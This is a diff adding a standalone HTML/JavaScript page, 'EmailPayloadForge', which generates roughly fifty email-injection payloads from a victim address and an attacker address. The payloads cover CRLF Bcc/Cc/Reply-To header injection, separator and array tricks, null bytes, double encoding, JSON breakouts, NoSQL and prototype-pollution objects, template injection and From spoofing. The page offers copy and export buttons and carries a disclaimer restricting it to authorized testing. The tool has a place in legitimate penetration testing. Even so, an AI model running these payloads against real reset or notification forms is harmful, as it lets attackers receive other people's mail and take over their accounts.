@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>EmailPayloadForge</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0f1117;color:#e2e8f0;min-height:100vh;padding:24px}
+  .container{max-width:900px;margin:0 auto}
+  h1{font-size:22px;font-weight:600;color:#f8fafc;margin-bottom:4px}
+  .sub{font-size:13px;color:#64748b;margin-bottom:20px}
+  .card{background:#1e2130;border:1px solid #2d3148;border-radius:12px;padding:20px;margin-bottom:16px}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px}
+  @media(max-width:600px){.row{grid-template-columns:1fr}}
+  label{font-size:12px;color:#94a3b8;display:block;margin-bottom:5px}
+  input[type=text]{width:100%;background:#13151f;border:1px solid #2d3148;border-radius:8px;padding:9px 12px;color:#e2e8f0;font-family:'Courier New',monospace;font-size:13px;outline:none;transition:border 0.2s}
+  input[type=text]:focus{border-color:#6366f1}
+  .toolbar{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
+  .btn{padding:8px 18px;border-radius:8px;border:1px solid #2d3148;background:#13151f;color:#e2e8f0;font-size:13px;font-weight:500;cursor:pointer;transition:all 0.15s}
+  .btn:hover{background:#2d3148}
+  .btn.primary{background:#6366f1;border-color:#6366f1;color:#fff}
+  .btn.primary:hover{background:#4f46e5}
+  .btn.export{background:#0f766e;border-color:#0f766e;color:#fff}
+  .btn.export:hover{background:#0d6460}
+  .btn.danger{background:#7f1d1d;border-color:#7f1d1d;color:#fca5a5}
+  .btn.danger:hover{background:#991b1b}
+  .disc{font-size:11px;color:#64748b;border-left:2px solid #dc2626;padding-left:10px;line-height:1.6}
+  .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:16px}
+  .stat{background:#13151f;border-radius:8px;padding:14px 16px;border:1px solid #1e2a3a}
+  .stat-n{font-size:26px;font-weight:700;color:#818cf8}
+  .stat-l{font-size:12px;color:#64748b;margin-top:2px}
+  .filter-bar{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
+  .ftag{font-size:11px;padding:4px 12px;border-radius:20px;border:1px solid #2d3148;background:transparent;color:#94a3b8;cursor:pointer;font-weight:500;transition:all 0.15s}
+  .ftag:hover{border-color:#6366f1;color:#a5b4fc}
+  .ftag.active{background:#6366f1;border-color:#6366f1;color:#fff}
+  .payload-list{background:#13151f;border:1px solid #2d3148;border-radius:10px;max-height:420px;overflow-y:auto}
+  .payload-list::-webkit-scrollbar{width:5px}
+  .payload-list::-webkit-scrollbar-track{background:#13151f}
+  .payload-list::-webkit-scrollbar-thumb{background:#2d3148;border-radius:4px}
+  .sec-head{font-size:10px;font-weight:700;letter-spacing:0.1em;color:#475569;padding:8px 12px;background:#0f1117;border-bottom:1px solid #1e2130;text-transform:uppercase;position:sticky;top:0;z-index:1}
+  .p-row{display:flex;align-items:center;border-bottom:1px solid #1a1f2e}
+  .p-row:last-child{border-bottom:none}
+  .p-row:hover{background:#1a1f2e}
+  .p-cat{font-size:10px;color:#475569;width:120px;min-width:120px;padding:7px 10px;border-right:1px solid #1a1f2e;font-family:'Courier New',monospace}
+  .p-val{flex:1;padding:7px 12px;color:#a5b4fc;word-break:break-all;font-size:12px;font-family:'Courier New',monospace}
+  .p-copy{padding:4px 10px;cursor:pointer;color:#475569;font-size:10px;background:none;border:none;border-left:1px solid #1a1f2e;white-space:nowrap;font-weight:600;transition:color 0.15s}
+  .p-copy:hover{color:#6366f1}
+  .empty{text-align:center;padding:48px;color:#475569;font-size:13px}
+  #stats-wrap{display:none}
+  .header-row{display:flex;align-items:center;gap:12px;margin-bottom:20px}
+  .logo{width:36px;height:36px;background:#6366f1;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header-row">
+    <div class="logo">&#9993;</div>
+    <div>
+      <h1>EmailPayloadForge</h1>
+      <div class="sub">Email injection payload generator &mdash; bug bounty &amp; authorized pentest use only</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="row">
+      <div>
+        <label>Original / target email</label>
+        <input type="text" id="orig" placeholder="victim@target.com" value="victim@target.com">
+      </div>
+      <div>
+        <label>Attacker / collector email</label>
+        <input type="text" id="atk" placeholder="attacker@gmail.com" value="attacker@gmail.com">
+      </div>
+    </div>
+    <div class="toolbar">
+      <button class="btn primary" onclick="generate()">Generate payloads</button>
+      <button class="btn export" onclick="exportTxt()">Export .txt</button>
+      <button class="btn danger" onclick="clearAll()">Clear</button>
+    </div>
+    <p class="disc">For authorized testing only &mdash; bug bounty programs with written scope, or systems you own. Never run against targets without explicit permission.</p>
+  </div>
+
+  <div id="stats-wrap">
+    <div class="stats">
+      <div class="stat"><div class="stat-n" id="s-total">0</div><div class="stat-l">Total payloads</div></div>
+      <div class="stat"><div class="stat-n" id="s-cats">0</div><div class="stat-l">Categories</div></div>
+      <div class="stat"><div class="stat-n" id="s-enc">0</div><div class="stat-l">Encoded variants</div></div>
+    </div>
+    <div class="filter-bar" id="filters"></div>
+    <div class="payload-list" id="plist"></div>
+  </div>
+
+  <div id="empty-state" class="empty">Enter both emails and click Generate payloads</div>
+</div>
+
+<script>
+let allPayloads = [];
+let activeFilter = 'All';
+
+function build(o, a) {
+  return [
+    {cat:'Comma',           v:`${o},${a}`},
+    {cat:'Comma',           v:`${a},${o}`},
+    {cat:'Comma',           v:` ${o} , ${a} `},
+    {cat:'Semicolon',       v:`${o};${a}`},
+    {cat:'Semicolon',       v:`${a};${o}`},
+    {cat:'Pipe',            v:`${o}|${a}`},
+    {cat:'Pipe',            v:`${a}|${o}`},
+    {cat:'Space',           v:`${o} ${a}`},
+    {cat:'Newline %0a',     v:`${o}%0a${a}`},
+    {cat:'Newline %0a',     v:`${a}%0a${o}`},
+    {cat:'Newline %0d%0a',  v:`${o}%0d%0a${a}`},
+    {cat:'Newline %0d%0a',  v:`${a}%0d%0aCc: ${o}`},
+    {cat:'CRLF inject',     v:`${o}%0d%0aBcc: ${a}`},
+    {cat:'CRLF inject',     v:`${o}\r\nBcc: ${a}`},
+    {cat:'CRLF inject',     v:`${o}\r\nCc: ${a}`},
+    {cat:'CRLF inject',     v:`${o}\nTo: ${a}`},
+    {cat:'CRLF inject',     v:`${o}\r\nReply-To: ${a}`},
+    {cat:'CRLF inject',     v:`${o}%0d%0aReply-To: ${a}`},
+    {cat:'CC header',       v:`${o}%0d%0aCC: ${a}`},
+    {cat:'BCC header',      v:`${o}%0d%0aBCC: ${a}`},
+    {cat:'Array',           v:`["${o}","${a}"]`},
+    {cat:'Array',           v:`["${a}","${o}"]`},
+    {cat:'Array JSON',      v:`{"email":["${o}","${a}"]}`},
+    {cat:'Array JSON',      v:`{"to":["${o}"],"cc":["${a}"]}`},
+    {cat:'Dot notation',    v:`${o.split('@')[0]}+${a.split('@')[0]}@${o.split('@')[1]}`},
+    {cat:'Plus concat',     v:`${o}+${a}`},
+    {cat:'Null byte',       v:`${o}%00${a}`},
+    {cat:'Null byte',       v:`${o}\x00${a}`},
+    {cat:'Unicode sep',     v:`${o}\u2028${a}`},
+    {cat:'Unicode sep',     v:`${o}\u2029${a}`},
+    {cat:'HTML entity',     v:`${o}&#44;${a}`},
+    {cat:'HTML entity',     v:`${o}&comma;${a}`},
+    {cat:'Double encode',   v:`${o}%252c${a}`},
+    {cat:'Double encode',   v:`${o}%250a${a}`},
+    {cat:'CC header',       v:`${o}\r\nCC: ${a}`},
+    {cat:'BCC header',      v:`${o}\r\nBCC: ${a}`},
+    {cat:'Reply-To',        v:`${o}\r\nReply-To: ${a}`},
+    {cat:'Reply-To',        v:`${o}%0d%0aReply-To: ${a}`},
+    {cat:'From spoof',      v:`${a} <${o}>`},
+    {cat:'From spoof',      v:`"${o}" <${a}>`},
+    {cat:'Nested obj',      v:`{"email":{"$eq":"${o}"},"notify":"${a}"}`},
+    {cat:'Prototype',       v:`{"email":"${o}","__proto__":{"notify":"${a}"}}`},
+    {cat:'Truncation',      v:`${o.split('@')[0]}${'a'.repeat(40)}@${o.split('@')[1]}`},
+    {cat:'Backslash',       v:`${o}\\${a}`},
+    {cat:'At-sign dup',     v:`${a}@${o}`},
+    {cat:'Quoted',          v:`"${o},${a}"`},
+    {cat:'Quoted',          v:`'${o},${a}'`},
+    {cat:'Tab sep',         v:`${o}\t${a}`},
+    {cat:'Tab sep',         v:`${o}%09${a}`},
+    {cat:'JSON string esc', v:`${o}","email":"${a}`},
+    {cat:'JSON break',      v:`${o}"},"email":"${a}`},
+    {cat:'Template inject', v:`${o}{{${a}}}`},
+    {cat:'Template inject', v:`${o}#{${a}}`},
+  ];
+}
+
+function generate() {
+  const o = document.getElementById('orig').value.trim();
+  const a = document.getElementById('atk').value.trim();
+  if (!o || !a) { alert('Enter both email addresses'); return; }
+
+  allPayloads = build(o, a);
+  const cats = ['All', ...new Set(allPayloads.map(p => p.cat))];
+  const enc = allPayloads.filter(p => p.v.includes('%') || p.v.includes('\\u') || p.v.includes('\\r') || p.v.includes('\\n')).length;
+
+  document.getElementById('s-total').textContent = allPayloads.length;
+  document.getElementById('s-cats').textContent = cats.length - 1;
+  document.getElementById('s-enc').textContent = enc;
+  document.getElementById('stats-wrap').style.display = 'block';
+  document.getElementById('empty-state').style.display = 'none';
+
+  const fb = document.getElementById('filters');
+  fb.innerHTML = '';
+  cats.forEach(c => {
+    const b = document.createElement('button');
+    b.className = 'ftag' + (c === activeFilter ? ' active' : '');
+    const cnt = c === 'All' ? allPayloads.length : allPayloads.filter(p => p.cat === c).length;
+    b.textContent = c === 'All' ? `All (${cnt})` : c;
+    b.onclick = () => {
+      activeFilter = c;
+      document.querySelectorAll('.ftag').forEach(x => x.classList.remove('active'));
+      b.classList.add('active');
+      renderList();
+    };
+    fb.appendChild(b);
+  });
+
+  activeFilter = 'All';
+  renderList();
+}
+
+function renderList() {
+  const pl = document.getElementById('plist');
+  const list = activeFilter === 'All' ? allPayloads : allPayloads.filter(p => p.cat === activeFilter);
+  if (!list.length) { pl.innerHTML = '<div class="empty">No payloads</div>'; return; }
+
+  let html = '';
+  let last = '';
+  list.forEach((p, i) => {
+    if (p.cat !== last) {
+      html += `<div class="sec-head">${p.cat}</div>`;
+      last = p.cat;
+    }
+    const esc = p.v.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    html += `<div class="p-row"><div class="p-cat">${p.cat}</div><div class="p-val">${esc}</div><button class="p-copy" onclick="copyOne(${i})">copy</button></div>`;
+  });
+  pl.innerHTML = html;
+}
+
+function copyOne(i) {
+  const filtered = activeFilter === 'All' ? allPayloads : allPayloads.filter(p => p.cat === activeFilter);
+  navigator.clipboard.writeText(filtered[i].v).then(() => {
+    const btns = document.querySelectorAll('.p-copy');
+    if (btns[i]) { btns[i].textContent = '✓'; setTimeout(() => btns[i].textContent = 'copy', 1200); }
+  });
+}
+
+function exportTxt() {
+  if (!allPayloads.length) { alert('Generate payloads first'); return; }
+  const o = document.getElementById('orig').value.trim();
+  const a = document.getElementById('atk').value.trim();
+  const lines = [
+    '# EmailPayloadForge',
+    `# Original  : ${o}`,
+    `# Attacker  : ${a}`,
+    `# Generated : ${new Date().toISOString()}`,
+    '# AUTHORIZED TESTING ONLY',
+    '',
+    ...allPayloads.map(p => `[${p.cat}] ${p.v}`)
+  ];
+  const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
+  const url = URL.createObjectURL(blob);
+  const link = document.createElement('a');
+  link.href = url; link.download = 'email_payloads.txt'; link.click();
+  URL.revokeObjectURL(url);
+}
+
+function clearAll() {
+  allPayloads = [];
+  document.getElementById('stats-wrap').style.display = 'none';
+  document.getElementById('empty-state').style.display = 'block';
+  document.getElementById('orig').value = '';
+  document.getElementById('atk').value = '';
+}
+</script>
+</body>
+</html>
